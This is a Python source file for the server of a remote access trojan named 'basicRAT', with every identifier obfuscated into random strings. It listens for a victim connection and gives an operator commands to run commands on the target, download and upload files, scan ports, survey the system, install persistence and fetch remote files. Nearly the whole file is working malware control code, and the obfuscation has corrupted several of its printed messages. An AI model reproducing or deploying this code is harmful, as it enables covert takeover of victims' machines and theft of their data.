#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import xYJEIEJwYxrIrxmzUDOdGnbQaPoRNnfl,LQOdRjWyVheTJCytAXEImYNlfGEClgVr,wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk
    from core.filesock import HbceFmYOVWlodQwVoWSxMaMBMGxoEetP, asXVMcyVvbVzovqlkrejIEPWhlhIaWVQ
except ImportError as eUdMFlCpoiDTFsjSnbxUiGiaoiDlKvCV:
    print eUdMFlCpoiDTFsjSnbxUiGiaoiDlKvCV
    sys.exit(0)
gIJRZpCekJmRlplOXrVNQPUlrtgjfvdA = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
mCHTtCzXatfwNuAdgWzxExnOVSeiNyxD = '''
______           _     ______  ___ _____   _            _   
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |  
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_ 
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_ 
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
                                                            
'''
JIkqHDuiDNLpZDoTyFoAfyYWzoufCVcT = [ 
            'download', 'help', 'persistence', 'quit', 'rekey', 
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget' 
]
def FrquNPvDaQNjlacFKSiykiGWvqCuQHzw():
    foYzGUQGPAvUbBPNUCxKslWkQHkkFbij = argparse.ArgumentParser(description='basicRAT server')
    foYzGUQGPAvUbBPNUCxKslWkQHkkFbij.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return foYzGUQGPAvUbBPNUCxKslWkQHkkFbij
def agwPkvRnVPJQSTqUBPpyQIvNgeNDeGSw():
    foYzGUQGPAvUbBPNUCxKslWkQHkkFbij  = FrquNPvDaQNjlacFKSiykiGWvqCuQHzw()
    SMydWZqbrZPtrAgFFbDIEDZOMqyUHWrw    = vars(foYzGUQGPAvUbBPNUCxKslWkQHkkFbij.parse_args())
    iljZTOWbwDzzmRhryJiDNWiBgluIbakt    = SMydWZqbrZPtrAgFFbDIEDZOMqyUHWrw['port']
    cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.bind(('0.0.0.0', iljZTOWbwDzzmRhryJiDNWiBgluIbakt))
    except socket.error:
        print 'Error: Unable to start server, iljZTOWbwDzzmRhryJiDNWiBgluIbakt {} in use?'.format(iljZTOWbwDzzmRhryJiDNWiBgluIbakt)
        sys.exit(1)
    for oAuVKJlXjfQlzjCXrwqYKyZsHfNqpvuz in mCHTtCzXatfwNuAdgWzxExnOVSeiNyxD.split('\n'):
        time.sleep(0.05)
        print oAuVKJlXjfQlzjCXrwqYKyZsHfNqpvuz
    print 'basicRAT server listening on iljZTOWbwDzzmRhryJiDNWiBgluIbakt {}...'.format(iljZTOWbwDzzmRhryJiDNWiBgluIbakt)
    cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.listen(10)
    DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ, XnghrnRRysXDrOCChxXbKkRQAFaFQibM = cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.accept()
    IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf = wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk(DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ, server=True)
    while True:
        IhCPxswmcfGEqPESPHWcwJDDhXcgCtMF = raw_input('\n[{}] basicRAT> '.format(XnghrnRRysXDrOCChxXbKkRQAFaFQibM[0])).rstrip()
        if not IhCPxswmcfGEqPESPHWcwJDDhXcgCtMF:
            continue
        nDtpiaZToxctTjxwhKsSYhIGPQjbpePx, _, action = IhCPxswmcfGEqPESPHWcwJDDhXcgCtMF.partition(' ')
        if nDtpiaZToxctTjxwhKsSYhIGPQjbpePx not in JIkqHDuiDNLpZDoTyFoAfyYWzoufCVcT:
            print 'Invalid command, type "help" to see IFSUonXzgpHrRBEOMrPKpFLYIQgZprUK list of commands.'
            continue
        if nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'help':
            print gIJRZpCekJmRlplOXrVNQPUlrtgjfvdA
            continue
        DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(IhCPxswmcfGEqPESPHWcwJDDhXcgCtMF, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        if nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'quit':
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.close()
            sys.exit(0)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'run':
            mKtbNoaVyGtwTuFsbGaLAMKrdkhybPZV = DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ.recv(4096)
            print xYJEIEJwYxrIrxmzUDOdGnbQaPoRNnfl(mKtbNoaVyGtwTuFsbGaLAMKrdkhybPZV, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf).rstrip()
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'download':
            for iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz in action.split():
                iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz = iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz.strip()
                HbceFmYOVWlodQwVoWSxMaMBMGxoEetP(DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ, iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'upload':
            for iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz in action.split():
                iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz = iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz.strip()
                asXVMcyVvbVzovqlkrejIEPWhlhIaWVQ(DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ, iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'rekey':
            IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf = wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk(DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ, server=True)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(nDtpiaZToxctTjxwhKsSYhIGPQjbpePx)
            mKtbNoaVyGtwTuFsbGaLAMKrdkhybPZV = DvrLUMbmtRoOLnYytlvlRIWXSOKNaqeQ.recv(1024)
            print xYJEIEJwYxrIrxmzUDOdGnbQaPoRNnfl(mKtbNoaVyGtwTuFsbGaLAMKrdkhybPZV, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
if __name__ == '__main__':
    agwPkvRnVPJQSTqUBPpyQIvNgeNDeGSw()
